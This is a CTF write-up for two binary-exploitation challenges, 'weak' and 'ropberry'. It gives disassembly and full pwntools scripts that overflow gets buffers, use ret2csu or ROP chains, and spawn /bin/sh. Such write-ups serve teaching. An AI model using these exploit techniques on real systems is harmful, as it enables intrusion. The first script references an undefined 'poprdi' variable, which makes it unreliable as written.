---
title: ALLMN CTF writeups
tags: wargame writeup ctf allmn weak ropberry
---

## 0. weak

### 0-0. Description

Someone is always asking me the same question when I try to find his secret. Can you answer his question and get his secret ? I can handle it.

He is waiting for you at: `ssh -i <your_keyfile> -p 2225 user@gimme-your-shell.ctf.insecurity-insa.fr`
To find your keyfile, look into your profile on this website.

[binary](https://static.ctf.insecurity-insa.fr/de3560ce34d9bd8e7555cf409bca7ecdd3dbe86b.tar.gz)

### 0-1. Execution
```bash
junheah@ubuntu:~/Desktop/allmn/1$ ./weak
Ok, now give me the name of our president.
this is the input
Oh I remember !
Thanks ! Good Bye :)
```
### 0-2. Disassembly
Lets take a closer look at the binary itself.
Input is taken by ``gets`` from ``vuln`` function
this is how ``vuln`` looks:
```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0000000000400554 <+0>:	push   rbp
   0x0000000000400555 <+1>:	mov    rbp,rsp
   0x0000000000400558 <+4>:	sub    rsp,0x10
   0x000000000040055c <+8>:	mov    edi,0x4006c0
   0x0000000000400561 <+13>:	call   0x400430 <puts@plt>
   0x0000000000400566 <+18>:	mov    edi,0x0
   0x000000000040056b <+23>:	call   0x400460 <fflush@plt>
   0x0000000000400570 <+28>:	lea    rax,[rbp-0x10]
   0x0000000000400574 <+32>:	mov    rdi,rax
   0x0000000000400577 <+35>:	call   0x400450 <gets@plt>
   0x000000000040057c <+40>:	mov    edi,0x4006eb
   0x0000000000400581 <+45>:	call   0x400430 <puts@plt>
   0x0000000000400586 <+50>:	mov    edi,0x0
   0x000000000040058b <+55>:	call   0x400460 <fflush@plt>
   0x0000000000400590 <+60>:	leave  
   0x0000000000400591 <+61>:	ret    
End of assembler dump.
```
it saves input to ``rbp-0x10`` using ``gets`` which means that input length is unlimited, making it possible to overflow the buffer.

Since the binay does not include ``'/bin/sh'`` string and ``system`` function, we have to make use of ``libc``.  And we can leak its base address by using  ``puts`` function.

But here's the problem: the binary doesn't have any useful gadgets. Which leads us to one solution: "using csu"

By using two gadgets from ``__libc__csu_init``, we can take control of ``edi``, ``rsi``, ``rdx`` registers, which is more than enough for using ``puts`` and ``system`` function.

### 0-3. Scenario
Following is the exploit scenario I came up with:
1. leak ``libc`` address with ``puts``
2. return to ``vuln`` function = take another input
3. ``system('/bin/sh')``

### 0-4. Exploit
Our first input stack should look like this:
<table>
	<tr><td>dummy data : 0x18 bytes</td></tr>
	<tr><td>return address for vuln ( csu_pop )</td></tr>
	<tr><td>rbx ( 0 )</td></tr>
	<tr><td>rbp ( 1 )</td></tr>
	<tr><td>r12 >> *return address for csu_mov ( puts@got )</td></tr>
	<tr><td>r13 >> edi ( puts@got )</td></tr>
	<tr><td>r14 >> rsi ( 0 )</td></tr>
	<tr><td>r15 >> rdx ( 0 )</td></tr>
	<tr><td>return addresss for csu_pop ( csu_mov )</td></tr>
	<tr><td>dummy data to go through csu_pop : 8*7 bytes ( 0 )</td></tr>
	<tr><td>return address for csu_pop_2 ( vuln )</td></tr>
</table>

after the first input, we should have the ``libc`` base address. Which allows us to make use of ``libc``

<br>
second input :
<table>
	<tr><td>dummy data : 0x18 bytes</td></tr>
	<tr><td>return address for vuln ( pop_rdi_ret )</td></tr>
	<tr><td>rdi ( address of '/bin/sh' )</td></tr>
	<tr><td>return address for pop_rdi_ret ( system )</td></tr>
</table>
<br>

exploit code:
```python
from pwn import *
#context.log_level='debug'

bin = ELF('./weak')
lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

# csu gadgets
csupop = 0x400636
csumov = 0x400620

#lib addresses
putsoff = lib.symbols['puts']
binshoff = 0x18cd57
poprdioff = 0x174cc5
systemoff = lib.symbols['system']

#bin addresses
vuln = bin.symbols['vuln']
putsplt = bin.plt['puts']
putsgot = bin.got['puts']

#payload
payload = 'a'*(0x10+8)
payload += p64(csupop) + p64(0)*2 + p64(1) + p64(putsgot) + p64(putsgot) + p64(0) + p64(0) + p64(csumov)
payload += p64(0)*7 + p64(vuln)

#open process
p = process(bin.path)
#gdb.attach(proc.pidof(p)[0],'b *0x400636')

#read input prompt
p.recvuntil('.\n')
#send payload
p.sendline(payload)
#read post-input prompt
p.recvuntil('!\n')
#read output (puts address) and calculate libc address
base = u64(p.recvn(6)+'\x00\x00') - putsoff

#payload 2
payload = 'a'*(0x10+8)
payload += p64(base + poprdi) + p64(base + binshoff) + p64(base + systemoff)

p.recvuntil('.\n')
p.sendline(payload)

p.interactive()
```

## 1. ropberry

### 1-0. Description

You hack this guy on challenge called `gimme-your-shell`, but he is still always asking me the same question when I try to find his secret. Maybe you can do something.

He is waiting for you at: `ssh -i <your_keyfile> -p 2226 user@ropberry.ctf.insecurity-insa.fr`
To find your keyfile, look into your profile on this website.

[binary](https://static.ctf.insecurity-insa.fr/e2bc7f2694aa1ab77c64b72184314bd36665ff17.tar.gz
)

### 1-1. Execution
```bash
junheah@ubuntu:~/Desktop/allmn/2$ ./ropberry 
> Ok, now give me the name of our president.
this is the input

```
### 1-2. Disassembly
Input is taken from ``vuln`` function by using ``gets``
```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x08048ed0 <+0>:	push   ebp
   0x08048ed1 <+1>:	mov    ebp,esp
   0x08048ed3 <+3>:	sub    esp,0x18
   0x08048ed6 <+6>:	lea    eax,ds:0x80c4f08
   0x08048edc <+12>:	mov    DWORD PTR [esp],eax
   0x08048edf <+15>:	call   0x80499c0 <printf>
   0x08048ee4 <+20>:	mov    ecx,0x0
   0x08048ee9 <+25>:	mov    DWORD PTR [esp],0x0
   0x08048ef0 <+32>:	mov    DWORD PTR [ebp-0x8],eax
   0x08048ef3 <+35>:	mov    DWORD PTR [ebp-0xc],ecx
   0x08048ef6 <+38>:	call   0x80499f0 <fflush>
   0x08048efb <+43>:	lea    ecx,[ebp-0x4]
   0x08048efe <+46>:	mov    DWORD PTR [esp],ecx
   0x08048f01 <+49>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048f04 <+52>:	call   0x8049af0 <gets>
   0x08048f09 <+57>:	mov    DWORD PTR [ebp-0x14],eax
   0x08048f0c <+60>:	add    esp,0x18
   0x08048f0f <+63>:	pop    ebp
   0x08048f10 <+64>:	ret    
End of assembler dump.
```

As we can see from the disassembly result, this binary doesn't use library. Which means that every function used inside this executable "is" inside this executable.

We can also check the absense of library by looking at the proccess map:
```
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x80ed000    0xa5000        0x0 /home/junheah/Desktop/allmn/2/ropberry
	 0x80ed000  0x80ef000     0x2000    0xa4000 /home/junheah/Desktop/allmn/2/ropberry
	 0x80ef000  0x8113000    0x24000        0x0 [heap]
	0xf7ff9000 0xf7ffc000     0x3000        0x0 [vvar]
	0xf7ffc000 0xf7ffe000     0x2000        0x0 [vdso]
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```
Since there are lots of functions, there are also lots of gadgets to make use of.
By using peda's ``ropgadget`` function, we can get a list of gadgets inside the binary:
```bash
gdb-peda$ ropgadget
ret = 0x8048134
addesp_4 = 0x807e9c9
popret = 0x80481ec
pop4ret = 0x804859b
pop3ret = 0x804859c
pop2ret = 0x804859d
...
```
But, the binary doesn't have ``/bin/sh`` string and ``system`` function. Which forces us to use ``int 0x80`` system interrupt.

### 1-3. Scenario
This is the attack scenario i came up with:
1. find writable space
2. write '/bin/sh' inside that space using gets
3. use system interrupt to call execve('/bin/sh', null, null)

To find the writeable space, we have to take a look at memory map of the process:
```
08048000-080ed000 r-xp 00000000 08:04 5243415                            /home/junheah/Desktop/allmn/2/ropberry
080ed000-080ef000 rw-p 000a4000 08:04 5243415                            /home/junheah/Desktop/allmn/2/ropberry
080ef000-08113000 rw-p 00000000 00:00 0                                  [heap]
f7ff9000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```
I chose to use ``heap`` section, which makes our input stack should look like this:
<table>
	<tr><td>dummy data : 8 bytes</td></tr>
	<tr><td>return address for vuln ( gets )</td></tr>
	<tr><td>return address for gets ( pop_ret )</td></tr>
	<tr><td>argv[1] for gets ( writeable_space )</td></tr>
	<tr><td>return address for pop_ret ( pop_ebx_ret )</td></tr>
	<tr><td>ebx >> argv[1] for system ( writable space )</td></tr>
	<tr><td>return address for pop_ebx_ret ( pop_ecx_ret )</td></tr>
	<tr><td>ecx >> argv[2] for system ( 0 )</td></tr>
	<tr><td>return address for pop_ecx_ret ( pop_edx_ret )</td></tr>
	<tr><td>edx >> argv[3] for system ( 0 )</td></tr>
	<tr><td>return address for pop_edx_ret ( pop_eax_ret )</td></tr>
	<tr><td>eax >  system interrupt code ( 11 [execve] )</td></tr>
	<tr><td>return address for pop_eax_ret ( int 0x80 )</td></tr>
</table>

### 1-4. Exploit
exploit code:
```python
from pwn import *
#context.log_level='debug'

bin = ELF('./ropberry')
gets = bin.symbols['gets']

#heap address
buffer = 0x80ef000 + 20

binsh = '/bin/sh'

#gadets
popret = 0x80481ec
int80 = 0x08059d6f
popeax = 0x080c1906
popebx = 0x080c28f9
popecx = 0x080e394a
popedx = 0x0805957a

#payload
payload = 'a'*(0x4+4)
payload += p32(gets) + p32(popret) + p32(buffer)
payload += p32(popebx) + p32(buffer) + p32(popecx) + p32(0) + p32(popedx) + p32(0) + p32(popeax) + p32(11) + p32(int80)

#open process
p = process(bin.path)

#read input prompt
print p.recvn(0x2d)

#gdb.attach(proc.pidof(p)[0],'b *vuln')

p.sendline(payload)
p.sendline(binsh)

p.interactive()
```
